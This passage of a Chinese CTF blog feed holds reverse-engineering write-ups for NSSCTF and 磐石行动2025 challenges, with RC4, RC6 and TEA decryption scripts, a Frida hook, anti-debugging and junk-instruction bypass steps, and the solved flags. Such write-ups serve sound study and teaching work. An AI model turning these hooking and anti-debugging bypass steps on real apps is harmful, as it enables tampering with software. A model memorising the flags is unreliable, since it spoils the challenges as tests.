class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span>, key: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    key_length = <span class="hljs-built_in">len</span>(key)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % key_length]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>    i = j = <span class="hljs-number">0</span><br>    out = <span class="hljs-built_in">bytearray</span>()<br>    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        K = S[(S[i] + S[j]) % <span class="hljs-number">256</span>]<br>        out.append(byte ^ K)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(out)<br>target_hex = <span class="hljs-string">&#x27;d29b81e136efc517c2967b863f584baf4b82f710f8869f5a56185cb22a9a25fc&#x27;</span><br>ciphertext = <span class="hljs-built_in">bytes</span>.fromhex(target_hex)<br><br>key = <span class="hljs-string">b&#x27;NSSCTF&#x27;</span><br><br>plaintext = rc4(ciphertext, key)<br><br><span class="hljs-keyword">try</span>:<br>    flag_content = plaintext.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><span class="hljs-keyword">except</span> UnicodeDecodeError:<br>    flag_content = plaintext.<span class="hljs-built_in">hex</span>()<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;NSSCTF&#123;&#123;<span class="hljs-subst">&#123;flag_content&#125;</span>&#125;&#125;&quot;</span>)<br></code></pre></td></tr></table></figure><p>NSSCTF{4984aa7eeb8c7fa0709832e364e03989}</p><h1 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h1><h2 id="我是谁？！"><a href="#我是谁？！" class="headerlink" title="我是谁？！"></a>我是谁？！</h2><p>看主函数得到flag的逻辑，这里用来验证账号是否有权限，如果有权限就通过 PR.showCND() 方法调用 stringFromJNI() </p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508261242323.png" alt="img"></p><p><code>stringFromJNI()</code> 是 <strong>flag 的来源</strong>。</p><p>主动调用 <code>PR pr = new PR(); pr.stringFromJNI()</code> 就能直接拿到 flag。</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508261242020.png" alt="img"></p><p>这里直接写hook脚本</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable constant_">PR</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.example.nss_4th.ad.PR&quot;</span>);<br>    <span class="hljs-keyword">var</span> pr = <span class="hljs-variable constant_">PR</span>.$new(); <span class="hljs-comment">// 创建一个 PR 对象</span><br>    <span class="hljs-keyword">var</span> flag = pr.<span class="hljs-title function_">stringFromJNI</span>(); <span class="hljs-comment">// 调用 JNI 方法</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] FLAG = &quot;</span> + flag);<br>  &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[!] 调用失败: &quot;</span> + e);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508261242982.png" alt="img"></p><p>NSSCTF{Y3s!NSS_hAs_r34ched_iTs_4th_5nNiv4rsar9}</p>]]></content>
    
    
    <categories>
      
      <category>reverse比赛复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-reverse-wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>磐石行动2025初赛逆向wp</title>
    <link href="/2025/08/16/%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82025%E5%88%9D%E8%B5%9B%E9%80%86%E5%90%91wp/"/>
    <url>/2025/08/16/%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82025%E5%88%9D%E8%B5%9B%E9%80%86%E5%90%91wp/</url>
    
    <content type="html"><![CDATA[<h1 id="磐石行动初赛2025逆向wp"><a href="#磐石行动初赛2025逆向wp" class="headerlink" title="磐石行动初赛2025逆向wp"></a>磐石行动初赛2025逆向wp</h1><h2 id="My-key"><a href="#My-key" class="headerlink" title="My-key"></a>My-key</h2><p>有好几处反调试，可以交叉引用</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508161749291.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508161749069.png" alt="img"></p><p>调试时改zf</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508161749337.png" alt="img"></p><p>sub_1400040A0是主函数位置，sub_140003A40是一个主要加密函数，动调的时候可以看到密钥的使用</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508161749327.png" alt="img"></p><p>sub_140003840是一个自定义的类似tea加密的函数，其实是rc6的加密方式， v37[j] &#x3D; v36[j] ^ *v8;这里是对key的xor</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508230118699.png" alt="img"></p><p>密钥可以通过动调得到，但在函数开头的<img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508161749877.png" alt="img">我们可以通过ResourceHacker工具找到<img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508161749641.png" alt="img"></p><p>  201, “FSZ36f3vU8s5”</p><p>  202, “WcE4Bbm4kHYQsAcX”</p><p>  203, “RKCTaz+fty1J2qsz4DI6t9bmMiLBxqFrpI70fU4IMemczIlM+z1IoVQobIt1MbXF”</p><p>异或的是WcE4Bbm4kHYQsAcX，密钥FSZ36f3vU8s5，密文RKCTaz+fty1J2qsz4DI6t9bmMiLBxqFrpI70fU4IMemczIlM+z1IoVQobIt1MbXF</p><p>这里给出解密代码，由于最后一步是base64加密，这里先将密文用base64解密得到hex，再进行后续的rc6解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><br>w = <span class="hljs-number">32</span><br>r = <span class="hljs-number">20</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ROTL</span>(<span class="hljs-params">x, y</span>):<br>    <span class="hljs-keyword">return</span> ((x &lt;&lt; (y &amp; (w-<span class="hljs-number">1</span>))) | (x &gt;&gt; (w - (y &amp; (w-<span class="hljs-number">1</span>))))) &amp; <span class="hljs-number">0xFFFFFFFF</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ROTR</span>(<span class="hljs-params">x, y</span>):<br>    <span class="hljs-keyword">return</span> ((x &gt;&gt; (y &amp; (w-<span class="hljs-number">1</span>))) | (x &lt;&lt; (w - (y &amp; (w-<span class="hljs-number">1</span>))))) &amp; <span class="hljs-number">0xFFFFFFFF</span><br><br>S_char = <span class="hljs-built_in">bytes</span>([<br>    <span class="hljs-number">0xE0</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xAA</span>, <br>    <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x5D</span>, <br>    <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x14</span>, <br>    <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x16</span>, <br>    <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x64</span>, <br>    <span class="hljs-number">0x34</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x51</span>, <br>    <span class="hljs-number">0x04</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x05</span>, <br>    <span class="hljs-number">0x8E</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xE2</span>, <br>    <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x7C</span>, <br>    <span class="hljs-number">0x44</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x31</span>, <br>    <span class="hljs-number">0x22</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xB6</span>, <br>    <span class="hljs-number">0x30</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x98</span>, <br>    <span class="hljs-number">0xDC</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0xFE</span>, <br>    <span class="hljs-number">0x81</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0xBA</span>, <br>    <span class="hljs-number">0xA9</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xB1</span>, <br>    <span class="hljs-number">0x85</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x5D</span>, <br>    <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xC7</span>, <br>    <span class="hljs-number">0xDF</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x54</span><br>])<br>S = [struct.unpack(<span class="hljs-string">&quot;&lt;I&quot;</span>, S_char[i*<span class="hljs-number">4</span>:i*<span class="hljs-number">4</span>+<span class="hljs-number">4</span>])[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(S_char)//<span class="hljs-number">4</span>)]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc6_decrypt_block</span>(<span class="hljs-params">block</span>):<br>    A, B, C, D = block<br>    C = (C - S[<span class="hljs-number">2</span>*r+<span class="hljs-number">3</span>]) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>    A = (A - S[<span class="hljs-number">2</span>*r+<span class="hljs-number">2</span>]) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(r, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>        A, B, C, D = D, A, B, C<br>        t = ROTL(B * (<span class="hljs-number">2</span>*B + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span>, <span class="hljs-number">5</span>)<br>        u = ROTL(D * (<span class="hljs-number">2</span>*D + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span>, <span class="hljs-number">5</span>)<br>        C = ROTR((C - S[<span class="hljs-number">2</span>*i+<span class="hljs-number">1</span>]) &amp; <span class="hljs-number">0xFFFFFFFF</span>, t) ^ u<br>        A = ROTR((A - S[<span class="hljs-number">2</span>*i]) &amp; <span class="hljs-number">0xFFFFFFFF</span>, u) ^ t<br>    D = (D - S[<span class="hljs-number">1</span>]) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>    B = (B - S[<span class="hljs-number">0</span>]) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>    <span class="hljs-keyword">return</span> [A, B, C, D]<br><br>data = <span class="hljs-built_in">bytes</span>([<br>    <span class="hljs-number">0x44</span>,<span class="hljs-number">0xa0</span>,<span class="hljs-number">0x93</span>,<span class="hljs-number">0x6b</span>,<span class="hljs-number">0x3f</span>,<span class="hljs-number">0x9f</span>,<span class="hljs-number">0xb7</span>,<span class="hljs-number">0x2d</span>,<br>    <span class="hljs-number">0x49</span>,<span class="hljs-number">0xda</span>,<span class="hljs-number">0xab</span>,<span class="hljs-number">0x33</span>,<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x32</span>,<span class="hljs-number">0x3a</span>,<span class="hljs-number">0xb7</span>,<br>    <span class="hljs-number">0xd6</span>,<span class="hljs-number">0xe6</span>,<span class="hljs-number">0x32</span>,<span class="hljs-number">0x22</span>,<span class="hljs-number">0xc1</span>,<span class="hljs-number">0xc6</span>,<span class="hljs-number">0xa1</span>,<span class="hljs-number">0x6b</span>,<br>    <span class="hljs-number">0xa4</span>,<span class="hljs-number">0x8e</span>,<span class="hljs-number">0xf4</span>,<span class="hljs-number">0x7d</span>,<span class="hljs-number">0x4e</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0xe9</span>,<br>    <span class="hljs-number">0x9c</span>,<span class="hljs-number">0xcc</span>,<span class="hljs-number">0x89</span>,<span class="hljs-number">0x4c</span>,<span class="hljs-number">0xfb</span>,<span class="hljs-number">0x3d</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0xa1</span>,<br>    <span class="hljs-number">0x54</span>,<span class="hljs-number">0x28</span>,<span class="hljs-number">0x6c</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0xb5</span>,<span class="hljs-number">0xc5</span><br>])<br><br>xor_key = <span class="hljs-string">b&quot;WcE4Bbm4kHYQsAcX&quot;</span><br><br>plain = <span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">48</span>, <span class="hljs-number">16</span>):<br>    block = struct.unpack(<span class="hljs-string">&quot;&lt;4I&quot;</span>, data[i:i+<span class="hljs-number">16</span>])<br>    decrypted = rc6_decrypt_block(block)<br>    plain += struct.pack(<span class="hljs-string">&quot;&lt;4I&quot;</span>, *decrypted)<br><br><br>plain = <span class="hljs-built_in">bytearray</span>(plain)<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    plain[j] ^= xor_key[j]<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>, <span class="hljs-number">48</span>):<br>    plain[j] ^= data[j-<span class="hljs-number">16</span>]<br><br><span class="hljs-built_in">print</span>(plain.decode(errors=<span class="hljs-string">&#x27;ignore&#x27;</span>))<br></code></pre></td></tr></table></figure><p>flag{68f25cc8-1a9f-40e8-ac3b-a85982a52f8f}</p><h2 id="cooki"><a href="#cooki" class="headerlink" title="cooki"></a>cooki</h2><p>有花指令，看汇编，在爆红的地方按d，这个E1是垃圾指令，nop就行，后续有好几处e1，都直接nop掉之后再选中主函数进行编译就能得到主加密函数</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508161740863.png" alt="img"></p><p>加密函数就是一个tea加密</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508161740854.png" alt="img"></p><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><br>a2 = [<span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>]<br>step = <span class="hljs-number">0x768CAB2E</span><br>v7 = [<br>    <span class="hljs-number">0x569A1C45</span>, <span class="hljs-number">0xEF2C6A10</span>,<br>    <span class="hljs-number">0xFB440BD6</span>, <span class="hljs-number">0x5797F41D</span>,<br>    <span class="hljs-number">0x523FF2C3</span>, <span class="hljs-number">0x48337CD9</span>,<br>    <span class="hljs-number">0x3616AC2D</span>, <span class="hljs-number">0x06B6312D</span><br>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_block</span>(<span class="hljs-params">v4_enc, v5_enc</span>):<br>    v4 = v4_enc<br>    v5 = v5_enc<br><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        current_step = <span class="hljs-number">32</span> - k<br>        v6 = (-step * current_step) &amp; <span class="hljs-number">0xFFFFFFFF</span><br><br>        term1 = v6<br>        term2 = (v4 + v6) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        term3 = (<span class="hljs-number">16</span> * v4 + a2[<span class="hljs-number">2</span>]) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        term4 = ((v4 &gt;&gt; <span class="hljs-number">5</span>) + a2[<span class="hljs-number">3</span>]) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        delta2 = (term1 ^ term2 ^ term3 ^ term4) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        v5_old = (v5 - delta2) &amp; <span class="hljs-number">0xFFFFFFFF</span><br><br>        term1_d1 = v6<br>        term2_d1 = (v5_old + v6) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        term3_d1 = (<span class="hljs-number">16</span> * v5_old + a2[<span class="hljs-number">0</span>]) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        term4_d1 = ((v5_old &gt;&gt; <span class="hljs-number">5</span>) + a2[<span class="hljs-number">1</span>]) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        delta1 = (term1_d1 ^ term2_d1 ^ term3_d1 ^ term4_d1) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        v4_old = (v4 - delta1) &amp; <span class="hljs-number">0xFFFFFFFF</span><br><br>        v4, v5 = v4_old, v5_old<br>    <span class="hljs-keyword">return</span> v4, v5<br><br><br>flag_bytes = <span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    v4_enc = v7[<span class="hljs-number">2</span> * i]<br>    v5_enc = v7[<span class="hljs-number">2</span> * i + <span class="hljs-number">1</span>]<br>    v4_orig, v5_orig = decrypt_block(v4_enc, v5_enc)<br>    flag_bytes += struct.pack(<span class="hljs-string">&quot;&lt;I&quot;</span>, v4_orig) + struct.pack(<span class="hljs-string">&quot;&lt;I&quot;</span>, v5_orig)<br><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Flag:&quot;</span>, flag_bytes.decode(<span class="hljs-string">&quot;ascii&quot;</span>))<br><span class="hljs-keyword">except</span> UnicodeDecodeError:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解密字节:&quot;</span>, flag_bytes.<span class="hljs-built_in">hex</span>())<br></code></pre></td></tr></table></figure><p>flag{b3d06a66f8aa86e3e6390f615e389e55}</p><h2 id="EasyRE"><a href="#EasyRE" class="headerlink" title="EasyRE"></a>EasyRE</h2><p>这题没管反调试，可以直接看加密逻辑，自定义的rc4加密算法，最后与密文比较</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508161749716.png" alt="img"></p><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">ror3</span>(<span class="hljs-params">x, n</span>):<br>    <span class="hljs-keyword">return</span> ((x &gt;&gt; n) | (x &lt;&lt; (<span class="hljs-number">8</span> - n))) &amp; <span class="hljs-number">0xFF</span><br><br>target = [<br>    <span class="hljs-number">0x93</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xD8</span>,<br>    <span class="hljs-number">0x5D</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x57</span><br>]<br><br>T = []<br>prev = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> target:<br>    t = (x ^ prev) ^ <span class="hljs-number">0x42</span><br>    T.append(t)<br>    prev = x<br><br><span class="hljs-comment"># Step 2: Simulate KSA</span><br>S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>j = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    j = (j + S[i] - <span class="hljs-number">7</span> * (i // <span class="hljs-number">7</span>) + i + 